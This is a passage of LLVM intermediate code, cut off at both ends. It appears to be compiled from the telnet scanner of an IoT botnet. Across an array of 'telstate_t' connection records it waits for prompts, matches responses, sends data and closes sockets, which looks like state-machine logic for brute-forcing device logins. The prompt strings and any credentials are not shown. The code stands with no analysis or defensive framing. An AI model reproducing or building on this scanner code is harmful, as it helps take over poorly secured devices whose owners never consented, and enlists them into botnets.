  %1541 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1540, i32 0, i32 8
  %1542 = load i8*, i8** %1541, align 8
  %1543 = load i32, i32* %2, align 4
  %1544 = sext i32 %1543 to i64
  %1545 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1544
  %1546 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1545, i32 0, i32 7
  %1547 = load i16, i16* %1546, align 16
  %1548 = zext i16 %1547 to i32
  %1549 = call i32 @readUntil(i32 %1537, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.36, i32 0, i32 0), i32 1, i32 0, i32 10000, i8* %1542, i32 1024, i32 %1548)
  %1550 = icmp ne i32 %1549, 0
  br i1 %1550, label %1551, label %1626

; <label>:1551:                                   ; preds = %1532
  %1552 = load i32, i32* %2, align 4
  %1553 = sext i32 %1552 to i64
  %1554 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1553
  %1555 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1554, i32 0, i32 6
  store i32 0, i32* %1555, align 4
  %1556 = load i32, i32* %2, align 4
  %1557 = sext i32 %1556 to i64
  %1558 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1557
  %1559 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1558, i32 0, i32 7
  store i16 0, i16* %1559, align 16
  %1560 = load i32, i32* %2, align 4
  %1561 = sext i32 %1560 to i64
  %1562 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1561
  %1563 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1562, i32 0, i32 8
  %1564 = load i8*, i8** %1563, align 8
  %1565 = call i8* @strstr(i8* %1564, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.36, i32 0, i32 0)) #10
  %1566 = icmp ne i8* %1565, null
  br i1 %1566, label %1567, label %1587

; <label>:1567:                                   ; preds = %1551
  %1568 = load i32, i32* %2, align 4
  %1569 = sext i32 %1568 to i64
  %1570 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1569
  %1571 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1570, i32 0, i32 8
  %1572 = load i8*, i8** %1571, align 8
  call void @llvm.memset.p0i8.i64(i8* %1572, i8 0, i64 1024, i32 1, i1 false)
  %1573 = load i32, i32* %2, align 4
  %1574 = sext i32 %1573 to i64
  %1575 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1574
  %1576 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1575, i32 0, i32 0
  %1577 = load i32, i32* %1576, align 16
  %1578 = call i32 @sclose(i32 %1577)
  %1579 = load i32, i32* %2, align 4
  %1580 = sext i32 %1579 to i64
  %1581 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1580
  %1582 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1581, i32 0, i32 2
  store i8 0, i8* %1582, align 8
  %1583 = load i32, i32* %2, align 4
  %1584 = sext i32 %1583 to i64
  %1585 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1584
  %1586 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1585, i32 0, i32 3
  store i8 0, i8* %1586, align 1
  br label %2047

; <label>:1587:                                   ; preds = %1551
  %1588 = load i32, i32* %2, align 4
  %1589 = sext i32 %1588 to i64
  %1590 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1589
  %1591 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1590, i32 0, i32 8
  %1592 = load i8*, i8** %1591, align 8
  %1593 = call i32 @matchPrompt(i8* %1592)
  %1594 = icmp ne i32 %1593, 0
  br i1 %1594, label %1615, label %1595

; <label>:1595:                                   ; preds = %1587
  %1596 = load i32, i32* %2, align 4
  %1597 = sext i32 %1596 to i64
  %1598 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1597
  %1599 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1598, i32 0, i32 8
  %1600 = load i8*, i8** %1599, align 8
  call void @llvm.memset.p0i8.i64(i8* %1600, i8 0, i64 1024, i32 1, i1 false)
  %1601 = load i32, i32* %2, align 4
  %1602 = sext i32 %1601 to i64
  %1603 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1602
  %1604 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1603, i32 0, i32 0
  %1605 = load i32, i32* %1604, align 16
  %1606 = call i32 @sclose(i32 %1605)
  %1607 = load i32, i32* %2, align 4
  %1608 = sext i32 %1607 to i64
  %1609 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1608
  %1610 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1609, i32 0, i32 2
  store i8 0, i8* %1610, align 8
  %1611 = load i32, i32* %2, align 4
  %1612 = sext i32 %1611 to i64
  %1613 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1612
  %1614 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1613, i32 0, i32 3
  store i8 1, i8* %1614, align 1
  br label %2047

; <label>:1615:                                   ; preds = %1587
  %1616 = load i32, i32* %2, align 4
  %1617 = sext i32 %1616 to i64
  %1618 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1617
  %1619 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1618, i32 0, i32 2
  store i8 7, i8* %1619, align 8
  br label %1620

; <label>:1620:                                   ; preds = %1615
  %1621 = load i32, i32* %2, align 4
  %1622 = sext i32 %1621 to i64
  %1623 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1622
  %1624 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1623, i32 0, i32 8
  %1625 = load i8*, i8** %1624, align 8
  call void @llvm.memset.p0i8.i64(i8* %1625, i8 0, i64 1024, i32 1, i1 false)
  br label %2047

; <label>:1626:                                   ; preds = %1532
  %1627 = load i32, i32* %2, align 4
  %1628 = sext i32 %1627 to i64
  %1629 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1628
  %1630 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1629, i32 0, i32 0
  %1631 = load i32, i32* %1630, align 16
  %1632 = load i32, i32* %2, align 4
  %1633 = sext i32 %1632 to i64
  %1634 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1633
  %1635 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1634, i32 0, i32 8
  %1636 = load i8*, i8** %1635, align 8
  %1637 = load i32, i32* %2, align 4
  %1638 = sext i32 %1637 to i64
  %1639 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1638
  %1640 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1639, i32 0, i32 7
  %1641 = load i16, i16* %1640, align 16
  %1642 = zext i16 %1641 to i32
  %1643 = call i32 @readUntil(i32 %1631, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.37, i32 0, i32 0), i32 1, i32 0, i32 10000, i8* %1636, i32 1024, i32 %1642)
  %1644 = icmp ne i32 %1643, 0
  br i1 %1644, label %1645, label %1720

; <label>:1645:                                   ; preds = %1626
  %1646 = load i32, i32* %2, align 4
  %1647 = sext i32 %1646 to i64
  %1648 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1647
  %1649 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1648, i32 0, i32 6
  store i32 0, i32* %1649, align 4
  %1650 = load i32, i32* %2, align 4
  %1651 = sext i32 %1650 to i64
  %1652 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1651
  %1653 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1652, i32 0, i32 7
  store i16 0, i16* %1653, align 16
  %1654 = load i32, i32* %2, align 4
  %1655 = sext i32 %1654 to i64
  %1656 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1655
  %1657 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1656, i32 0, i32 8
  %1658 = load i8*, i8** %1657, align 8
  %1659 = call i8* @strstr(i8* %1658, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.37, i32 0, i32 0)) #10
  %1660 = icmp ne i8* %1659, null
  br i1 %1660, label %1661, label %1681

; <label>:1661:                                   ; preds = %1645
  %1662 = load i32, i32* %2, align 4
  %1663 = sext i32 %1662 to i64
  %1664 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1663
  %1665 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1664, i32 0, i32 8
  %1666 = load i8*, i8** %1665, align 8
  call void @llvm.memset.p0i8.i64(i8* %1666, i8 0, i64 1024, i32 1, i1 false)
  %1667 = load i32, i32* %2, align 4
  %1668 = sext i32 %1667 to i64
  %1669 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1668
  %1670 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1669, i32 0, i32 0
  %1671 = load i32, i32* %1670, align 16
  %1672 = call i32 @sclose(i32 %1671)
  %1673 = load i32, i32* %2, align 4
  %1674 = sext i32 %1673 to i64
  %1675 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1674
  %1676 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1675, i32 0, i32 2
  store i8 0, i8* %1676, align 8
  %1677 = load i32, i32* %2, align 4
  %1678 = sext i32 %1677 to i64
  %1679 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1678
  %1680 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1679, i32 0, i32 3
  store i8 0, i8* %1680, align 1
  br label %2047

; <label>:1681:                                   ; preds = %1645
  %1682 = load i32, i32* %2, align 4
  %1683 = sext i32 %1682 to i64
  %1684 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1683
  %1685 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1684, i32 0, i32 8
  %1686 = load i8*, i8** %1685, align 8
  %1687 = call i32 @matchPrompt(i8* %1686)
  %1688 = icmp ne i32 %1687, 0
  br i1 %1688, label %1709, label %1689

; <label>:1689:                                   ; preds = %1681
  %1690 = load i32, i32* %2, align 4
  %1691 = sext i32 %1690 to i64
  %1692 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1691
  %1693 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1692, i32 0, i32 8
  %1694 = load i8*, i8** %1693, align 8
  call void @llvm.memset.p0i8.i64(i8* %1694, i8 0, i64 1024, i32 1, i1 false)
  %1695 = load i32, i32* %2, align 4
  %1696 = sext i32 %1695 to i64
  %1697 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1696
  %1698 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1697, i32 0, i32 0
  %1699 = load i32, i32* %1698, align 16
  %1700 = call i32 @sclose(i32 %1699)
  %1701 = load i32, i32* %2, align 4
  %1702 = sext i32 %1701 to i64
  %1703 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1702
  %1704 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1703, i32 0, i32 2
  store i8 0, i8* %1704, align 8
  %1705 = load i32, i32* %2, align 4
  %1706 = sext i32 %1705 to i64
  %1707 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1706
  %1708 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1707, i32 0, i32 3
  store i8 1, i8* %1708, align 1
  br label %2047

; <label>:1709:                                   ; preds = %1681
  %1710 = load i32, i32* %2, align 4
  %1711 = sext i32 %1710 to i64
  %1712 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1711
  %1713 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1712, i32 0, i32 2
  store i8 7, i8* %1713, align 8
  br label %1714

; <label>:1714:                                   ; preds = %1709
  %1715 = load i32, i32* %2, align 4
  %1716 = sext i32 %1715 to i64
  %1717 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1716
  %1718 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1717, i32 0, i32 8
  %1719 = load i8*, i8** %1718, align 8
  call void @llvm.memset.p0i8.i64(i8* %1719, i8 0, i64 1024, i32 1, i1 false)
  br label %2047

; <label>:1720:                                   ; preds = %1626
  %1721 = load i32, i32* %2, align 4
  %1722 = sext i32 %1721 to i64
  %1723 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1722
  %1724 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1723, i32 0, i32 0
  %1725 = load i32, i32* %1724, align 16
  %1726 = load i32, i32* %2, align 4
  %1727 = sext i32 %1726 to i64
  %1728 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1727
  %1729 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1728, i32 0, i32 8
  %1730 = load i8*, i8** %1729, align 8
  %1731 = load i32, i32* %2, align 4
  %1732 = sext i32 %1731 to i64
  %1733 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1732
  %1734 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1733, i32 0, i32 7
  %1735 = load i16, i16* %1734, align 16
  %1736 = zext i16 %1735 to i32
  %1737 = call i32 @readUntil(i32 %1725, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.38, i32 0, i32 0), i32 1, i32 0, i32 10000, i8* %1730, i32 1024, i32 %1736)
  %1738 = icmp ne i32 %1737, 0
  br i1 %1738, label %1739, label %1814

; <label>:1739:                                   ; preds = %1720
  %1740 = load i32, i32* %2, align 4
  %1741 = sext i32 %1740 to i64
  %1742 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1741
  %1743 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1742, i32 0, i32 6
  store i32 0, i32* %1743, align 4
  %1744 = load i32, i32* %2, align 4
  %1745 = sext i32 %1744 to i64
  %1746 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1745
  %1747 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1746, i32 0, i32 7
  store i16 0, i16* %1747, align 16
  %1748 = load i32, i32* %2, align 4
  %1749 = sext i32 %1748 to i64
  %1750 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1749
  %1751 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1750, i32 0, i32 8
  %1752 = load i8*, i8** %1751, align 8
  %1753 = call i8* @strstr(i8* %1752, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.38, i32 0, i32 0)) #10
  %1754 = icmp ne i8* %1753, null
  br i1 %1754, label %1755, label %1775

; <label>:1755:                                   ; preds = %1739
  %1756 = load i32, i32* %2, align 4
  %1757 = sext i32 %1756 to i64
  %1758 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1757
  %1759 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1758, i32 0, i32 8
  %1760 = load i8*, i8** %1759, align 8
  call void @llvm.memset.p0i8.i64(i8* %1760, i8 0, i64 1024, i32 1, i1 false)
  %1761 = load i32, i32* %2, align 4
  %1762 = sext i32 %1761 to i64
  %1763 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1762
  %1764 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1763, i32 0, i32 0
  %1765 = load i32, i32* %1764, align 16
  %1766 = call i32 @sclose(i32 %1765)
  %1767 = load i32, i32* %2, align 4
  %1768 = sext i32 %1767 to i64
  %1769 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1768
  %1770 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1769, i32 0, i32 2
  store i8 0, i8* %1770, align 8
  %1771 = load i32, i32* %2, align 4
  %1772 = sext i32 %1771 to i64
  %1773 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1772
  %1774 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1773, i32 0, i32 3
  store i8 0, i8* %1774, align 1
  br label %2047

; <label>:1775:                                   ; preds = %1739
  %1776 = load i32, i32* %2, align 4
  %1777 = sext i32 %1776 to i64
  %1778 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1777
  %1779 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1778, i32 0, i32 8
  %1780 = load i8*, i8** %1779, align 8
  %1781 = call i32 @matchPrompt(i8* %1780)
  %1782 = icmp ne i32 %1781, 0
  br i1 %1782, label %1803, label %1783

; <label>:1783:                                   ; preds = %1775
  %1784 = load i32, i32* %2, align 4
  %1785 = sext i32 %1784 to i64
  %1786 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1785
  %1787 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1786, i32 0, i32 8
  %1788 = load i8*, i8** %1787, align 8
  call void @llvm.memset.p0i8.i64(i8* %1788, i8 0, i64 1024, i32 1, i1 false)
  %1789 = load i32, i32* %2, align 4
  %1790 = sext i32 %1789 to i64
  %1791 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1790
  %1792 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1791, i32 0, i32 0
  %1793 = load i32, i32* %1792, align 16
  %1794 = call i32 @sclose(i32 %1793)
  %1795 = load i32, i32* %2, align 4
  %1796 = sext i32 %1795 to i64
  %1797 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1796
  %1798 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1797, i32 0, i32 2
  store i8 0, i8* %1798, align 8
  %1799 = load i32, i32* %2, align 4
  %1800 = sext i32 %1799 to i64
  %1801 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1800
  %1802 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1801, i32 0, i32 3
  store i8 1, i8* %1802, align 1
  br label %2047

; <label>:1803:                                   ; preds = %1775
  %1804 = load i32, i32* %2, align 4
  %1805 = sext i32 %1804 to i64
  %1806 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1805
  %1807 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1806, i32 0, i32 2
  store i8 7, i8* %1807, align 8
  br label %1808

; <label>:1808:                                   ; preds = %1803
  %1809 = load i32, i32* %2, align 4
  %1810 = sext i32 %1809 to i64
  %1811 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1810
  %1812 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1811, i32 0, i32 8
  %1813 = load i8*, i8** %1812, align 8
  call void @llvm.memset.p0i8.i64(i8* %1813, i8 0, i64 1024, i32 1, i1 false)
  br label %2047

; <label>:1814:                                   ; preds = %1720
  %1815 = load i32, i32* %2, align 4
  %1816 = sext i32 %1815 to i64
  %1817 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1816
  %1818 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1817, i32 0, i32 0
  %1819 = load i32, i32* %1818, align 16
  %1820 = load i32, i32* %2, align 4
  %1821 = sext i32 %1820 to i64
  %1822 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1821
  %1823 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1822, i32 0, i32 8
  %1824 = load i8*, i8** %1823, align 8
  %1825 = load i32, i32* %2, align 4
  %1826 = sext i32 %1825 to i64
  %1827 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1826
  %1828 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1827, i32 0, i32 7
  %1829 = load i16, i16* %1828, align 16
  %1830 = zext i16 %1829 to i32
  %1831 = call i32 @readUntil(i32 %1819, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.39, i32 0, i32 0), i32 1, i32 0, i32 10000, i8* %1824, i32 1024, i32 %1830)
  %1832 = icmp ne i32 %1831, 0
  br i1 %1832, label %1833, label %1908

; <label>:1833:                                   ; preds = %1814
  %1834 = load i32, i32* %2, align 4
  %1835 = sext i32 %1834 to i64
  %1836 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1835
  %1837 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1836, i32 0, i32 6
  store i32 0, i32* %1837, align 4
  %1838 = load i32, i32* %2, align 4
  %1839 = sext i32 %1838 to i64
  %1840 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1839
  %1841 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1840, i32 0, i32 7
  store i16 0, i16* %1841, align 16
  %1842 = load i32, i32* %2, align 4
  %1843 = sext i32 %1842 to i64
  %1844 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1843
  %1845 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1844, i32 0, i32 8
  %1846 = load i8*, i8** %1845, align 8
  %1847 = call i8* @strstr(i8* %1846, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.39, i32 0, i32 0)) #10
  %1848 = icmp ne i8* %1847, null
  br i1 %1848, label %1849, label %1869

; <label>:1849:                                   ; preds = %1833
  %1850 = load i32, i32* %2, align 4
  %1851 = sext i32 %1850 to i64
  %1852 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1851
  %1853 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1852, i32 0, i32 8
  %1854 = load i8*, i8** %1853, align 8
  call void @llvm.memset.p0i8.i64(i8* %1854, i8 0, i64 1024, i32 1, i1 false)
  %1855 = load i32, i32* %2, align 4
  %1856 = sext i32 %1855 to i64
  %1857 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1856
  %1858 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1857, i32 0, i32 0
  %1859 = load i32, i32* %1858, align 16
  %1860 = call i32 @sclose(i32 %1859)
  %1861 = load i32, i32* %2, align 4
  %1862 = sext i32 %1861 to i64
  %1863 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1862
  %1864 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1863, i32 0, i32 2
  store i8 0, i8* %1864, align 8
  %1865 = load i32, i32* %2, align 4
  %1866 = sext i32 %1865 to i64
  %1867 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1866
  %1868 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1867, i32 0, i32 3
  store i8 0, i8* %1868, align 1
  br label %2047

; <label>:1869:                                   ; preds = %1833
  %1870 = load i32, i32* %2, align 4
  %1871 = sext i32 %1870 to i64
  %1872 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1871
  %1873 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1872, i32 0, i32 8
  %1874 = load i8*, i8** %1873, align 8
  %1875 = call i32 @matchPrompt(i8* %1874)
  %1876 = icmp ne i32 %1875, 0
  br i1 %1876, label %1897, label %1877

; <label>:1877:                                   ; preds = %1869
  %1878 = load i32, i32* %2, align 4
  %1879 = sext i32 %1878 to i64
  %1880 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1879
  %1881 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1880, i32 0, i32 8
  %1882 = load i8*, i8** %1881, align 8
  call void @llvm.memset.p0i8.i64(i8* %1882, i8 0, i64 1024, i32 1, i1 false)
  %1883 = load i32, i32* %2, align 4
  %1884 = sext i32 %1883 to i64
  %1885 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1884
  %1886 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1885, i32 0, i32 0
  %1887 = load i32, i32* %1886, align 16
  %1888 = call i32 @sclose(i32 %1887)
  %1889 = load i32, i32* %2, align 4
  %1890 = sext i32 %1889 to i64
  %1891 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1890
  %1892 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1891, i32 0, i32 2
  store i8 0, i8* %1892, align 8
  %1893 = load i32, i32* %2, align 4
  %1894 = sext i32 %1893 to i64
  %1895 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1894
  %1896 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1895, i32 0, i32 3
  store i8 1, i8* %1896, align 1
  br label %2047

; <label>:1897:                                   ; preds = %1869
  %1898 = load i32, i32* %2, align 4
  %1899 = sext i32 %1898 to i64
  %1900 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1899
  %1901 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1900, i32 0, i32 2
  store i8 7, i8* %1901, align 8
  br label %1902

; <label>:1902:                                   ; preds = %1897
  %1903 = load i32, i32* %2, align 4
  %1904 = sext i32 %1903 to i64
  %1905 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1904
  %1906 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1905, i32 0, i32 8
  %1907 = load i8*, i8** %1906, align 8
  call void @llvm.memset.p0i8.i64(i8* %1907, i8 0, i64 1024, i32 1, i1 false)
  br label %2047

; <label>:1908:                                   ; preds = %1814
  %1909 = load i32, i32* %2, align 4
  %1910 = sext i32 %1909 to i64
  %1911 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1910
  %1912 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1911, i32 0, i32 8
  %1913 = load i8*, i8** %1912, align 8
  %1914 = call i64 @strlen(i8* %1913) #10
  %1915 = trunc i64 %1914 to i16
  %1916 = load i32, i32* %2, align 4
  %1917 = sext i32 %1916 to i64
  %1918 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1917
  %1919 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1918, i32 0, i32 7
  store i16 %1915, i16* %1919, align 16
  br label %1920

; <label>:1920:                                   ; preds = %1908
  br label %1921

; <label>:1921:                                   ; preds = %1920
  br label %1922

; <label>:1922:                                   ; preds = %1921
  br label %1923

; <label>:1923:                                   ; preds = %1922
  br label %1924

; <label>:1924:                                   ; preds = %1923
  br label %1925

; <label>:1925:                                   ; preds = %1924
  br label %1926

; <label>:1926:                                   ; preds = %1925
  br label %1927

; <label>:1927:                                   ; preds = %1926
  %1928 = load i32, i32* %2, align 4
  %1929 = sext i32 %1928 to i64
  %1930 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1929
  %1931 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1930, i32 0, i32 6
  %1932 = load i32, i32* %1931, align 4
  %1933 = add i32 %1932, 10
  %1934 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %1935 = icmp ult i32 %1933, %1934
  br i1 %1935, label %1936, label %1951

; <label>:1936:                                   ; preds = %1927
  %1937 = load i32, i32* %2, align 4
  %1938 = sext i32 %1937 to i64
  %1939 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1938
  %1940 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1939, i32 0, i32 0
  %1941 = load i32, i32* %1940, align 16
  %1942 = call i32 @sclose(i32 %1941)
  %1943 = load i32, i32* %2, align 4
  %1944 = sext i32 %1943 to i64
  %1945 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1944
  %1946 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1945, i32 0, i32 2
  store i8 0, i8* %1946, align 8
  %1947 = load i32, i32* %2, align 4
  %1948 = sext i32 %1947 to i64
  %1949 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1948
  %1950 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1949, i32 0, i32 3
  store i8 1, i8* %1950, align 1
  br label %1951

; <label>:1951:                                   ; preds = %1936, %1927
  br label %2046

; <label>:1952:                                   ; preds = %68
  %1953 = load i32, i32* %2, align 4
  %1954 = sext i32 %1953 to i64
  %1955 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1954
  %1956 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1955, i32 0, i32 0
  %1957 = load i32, i32* %1956, align 16
  %1958 = call i64 @send(i32 %1957, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.40, i32 0, i32 0), i64 4, i32 16384)
  %1959 = icmp slt i64 %1958, 0
  br i1 %1959, label %1960, label %1975

; <label>:1960:                                   ; preds = %1952
  %1961 = load i32, i32* %2, align 4
  %1962 = sext i32 %1961 to i64
  %1963 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1962
  %1964 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1963, i32 0, i32 0
  %1965 = load i32, i32* %1964, align 16
  %1966 = call i32 @sclose(i32 %1965)
  %1967 = load i32, i32* %2, align 4
  %1968 = sext i32 %1967 to i64
  %1969 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1968
  %1970 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1969, i32 0, i32 2
  store i8 0, i8* %1970, align 8
  %1971 = load i32, i32* %2, align 4
